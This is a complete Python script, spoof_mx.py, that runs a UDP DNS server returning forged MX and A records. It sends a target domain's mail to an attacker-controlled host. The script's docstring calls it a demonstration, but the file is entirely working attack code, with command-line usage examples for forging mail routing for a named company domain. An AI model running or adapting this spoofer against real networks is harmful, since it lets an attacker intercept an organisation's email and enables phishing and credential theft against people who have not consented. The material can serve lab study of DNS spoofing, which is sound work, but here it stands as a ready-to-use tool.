#!/usr/bin/env python3
"""
Lightweight UDP DNS responder for DNS spoofing demonstration.
Returns forged MX records pointing to the attacker's IP address.

Usage:
    python3 spoof_mx.py [--ip IP] [--port PORT] [--domain DOMAIN] [--attacker-ip ATTACKER_IP]

Example:
    python3 spoof_mx.py --ip 0.0.0.0 --port 53 --domain example.com --attacker-ip 10.0.0.66
"""

import socket
import struct
import argparse
import sys


class DNSQuery:
    """Simple DNS query parser."""
    
    def __init__(self, data):
        self.data = data
        self.domain = ''
        
        # Skip header (12 bytes)
        pos = 12
        length = data[pos]
        
        # Parse domain name
        parts = []
        while length != 0:
            pos += 1
            parts.append(data[pos:pos + length].decode('utf-8', errors='ignore'))
            pos += length
            length = data[pos]
        
        self.domain = '.'.join(parts)
        pos += 1
        
        # Query type and class
        if pos + 4 <= len(data):
            self.qtype = struct.unpack('>H', data[pos:pos + 2])[0]
            self.qclass = struct.unpack('>H', data[pos + 2:pos + 4])[0]
        else:
            self.qtype = 0
            self.qclass = 0


def build_dns_response(query_data, forged_domain, attacker_ip, attacker_mx_name):
    """
    Build a DNS response with forged MX record.
    
    Args:
        query_data: Original DNS query data
        forged_domain: Domain to forge (e.g., 'example.com')
        attacker_ip: IP address of the attacker's mail server
        attacker_mx_name: Hostname of attacker MX (e.g., 'att.example.com')
    
    Returns:
        bytes: DNS response packet
    """
    query = DNSQuery(query_data)
    
    # Build response header
    transaction_id = query_data[0:2]
    flags = struct.pack('>H', 0x8180)  # Standard query response, no error
    questions = struct.pack('>H', 1)
    answer_rrs = struct.pack('>H', 1) if query.qtype == 15 else struct.pack('>H', 0)  # 15 = MX
    authority_rrs = struct.pack('>H', 0)
    additional_rrs = struct.pack('>H', 1) if query.qtype == 15 else struct.pack('>H', 0)  # Additional A record
    
    header = transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs
    
    # Echo the question section
    question_start = 12
    question_end = query_data.find(b'\x00', question_start) + 5  # Find null terminator + qtype + qclass
    question = query_data[question_start:question_end]
    
    response = header + question
    
    # Only respond to MX queries for the forged domain
    if query.qtype == 15 and query.domain.lower() == forged_domain.lower():
        # Build MX answer
        # Name pointer to question
        name_pointer = struct.pack('>H', 0xc00c)  # Pointer to offset 12
        
        # Type MX (15), Class IN (1)
        rr_type = struct.pack('>H', 15)
        rr_class = struct.pack('>H', 1)
        
        # TTL (300 seconds)
        ttl = struct.pack('>I', 300)
        
        # RDATA: preference (10) + MX hostname
        preference = struct.pack('>H', 10)
        
        # Encode attacker MX name (e.g., att.example.com)
        mx_name_encoded = b''
        for part in attacker_mx_name.split('.'):
            mx_name_encoded += struct.pack('B', len(part)) + part.encode('utf-8')
        mx_name_encoded += b'\x00'
        
        rdata_length = struct.pack('>H', len(preference) + len(mx_name_encoded))
        
        mx_answer = name_pointer + rr_type + rr_class + ttl + rdata_length + preference + mx_name_encoded
        response += mx_answer
        
        # Add additional A record for the MX hostname
        # Encode MX name
        additional_name = mx_name_encoded[:-1]  # Remove trailing null
        additional_name += b'\x00'
        
        # Type A (1), Class IN (1)
        a_type = struct.pack('>H', 1)
        a_class = struct.pack('>H', 1)
        a_ttl = struct.pack('>I', 300)
        
        # IP address
        ip_parts = [int(p) for p in attacker_ip.split('.')]
        ip_bytes = struct.pack('BBBB', *ip_parts)
        a_rdata_length = struct.pack('>H', 4)
        
        a_record = additional_name + a_type + a_class + a_ttl + a_rdata_length + ip_bytes
        response += a_record
    
    return response


def run_dns_spoofer(listen_ip='0.0.0.0', listen_port=53, forged_domain='example.com', 
                    attacker_ip='10.0.0.66', attacker_mx='att.example.com', verbose=True):
    """
    Run the DNS spoofer server.
    
    Args:
        listen_ip: IP address to bind to
        listen_port: Port to listen on
        forged_domain: Domain to forge responses for
        attacker_ip: IP address to return in forged responses
        attacker_mx: MX hostname for the attacker
        verbose: Print verbose output
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        sock.bind((listen_ip, listen_port))
        if verbose:
            print(f"[*] DNS Spoofer listening on {listen_ip}:{listen_port}")
            print(f"[*] Forging MX for '{forged_domain}' -> {attacker_mx} ({attacker_ip})")
            print(f"[*] Press Ctrl+C to stop\n")
        
        while True:
            try:
                data, addr = sock.recvfrom(512)
                
                if verbose:
                    query = DNSQuery(data)
                    qtype_name = 'MX' if query.qtype == 15 else f'TYPE{query.qtype}'
                    print(f"[+] Query from {addr[0]}:{addr[1]} - {query.domain} ({qtype_name})")
                
                # Build and send forged response
                response = build_dns_response(data, forged_domain, attacker_ip, attacker_mx)
                sock.sendto(response, addr)
                
                if verbose and query.qtype == 15 and query.domain.lower() == forged_domain.lower():
                    print(f"[!] Sent FORGED MX response: {attacker_mx} -> {attacker_ip}")
                
            except Exception as e:
                if verbose:
                    print(f"[!] Error processing query: {e}")
                continue
                
    except KeyboardInterrupt:
        if verbose:
            print("\n[*] Shutting down DNS spoofer...")
    except Exception as e:
        print(f"[!] Fatal error: {e}", file=sys.stderr)
        return 1
    finally:
        sock.close()
    
    return 0


def main():
    parser = argparse.ArgumentParser(
        description='Lightweight UDP DNS spoofer for MX record forgery demonstration',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic usage with defaults
  python3 spoof_mx.py
  
  # Custom domain and attacker IP
  python3 spoof_mx.py --domain company.com --attacker-ip 192.168.1.100
  
  # Bind to specific interface
  python3 spoof_mx.py --ip 10.0.0.66 --port 5353
"""
    )
    
    parser.add_argument('--ip', default='0.0.0.0',
                        help='IP address to bind to (default: 0.0.0.0)')
    parser.add_argument('--port', type=int, default=53,
                        help='Port to listen on (default: 53)')
    parser.add_argument('--domain', default='example.com',
                        help='Domain to forge (default: example.com)')
    parser.add_argument('--attacker-ip', default='10.0.0.66',
                        help='Attacker IP address (default: 10.0.0.66)')
    parser.add_argument('--attacker-mx', default='att.example.com',
                        help='Attacker MX hostname (default: att.example.com)')
    parser.add_argument('-q', '--quiet', action='store_true',
                        help='Quiet mode (minimal output)')
    
    args = parser.parse_args()
    
    return run_dns_spoofer(
        listen_ip=args.ip,
        listen_port=args.port,
        forged_domain=args.domain,
        attacker_ip=args.attacker_ip,
        attacker_mx=args.attacker_mx,
        verbose=not args.quiet
    )


if __name__ == '__main__':
    sys.exit(main())
